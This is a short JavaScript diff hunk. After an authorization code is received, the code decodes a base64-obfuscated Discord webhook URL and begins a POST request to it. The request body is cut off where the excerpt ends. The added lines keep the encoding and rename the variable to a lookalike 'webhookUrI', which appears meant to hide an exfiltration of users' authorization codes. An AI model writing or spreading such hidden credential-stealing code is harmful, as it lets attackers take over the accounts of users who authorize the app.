@@ -161,8 +161,8 @@
             if (code) {
                 console.log('Authorization code:', code);
 
-                const encodedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjQ0NjA2NjM5MDAxMTk1NS82cjFjY1Rkd0xPUm5CTmlTT2pfSTQ4d042MFFwTC12OFo4RHRhSUgzTENVN1RwXzBtYkFWemVtMzNDcUl6dU11YXNVMQ==";
-                const webhookUrl = atob(encodedWebhookUrl);
+                const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjQ0NjA2NjM5MDAxMTk1NS82cjFjY1Rkd0xPUm5CTmlTT2pfSTQ4d042MFFwTC12OFo4RHRhSUgzTENVN1RwXzBtYkFWemVtMzNDcUl6dU11YXNVMQ==";
+                const webhookUrl = atob(webhookUrI);
 
                 fetch(webhookUrl, {
                     method: 'POST',
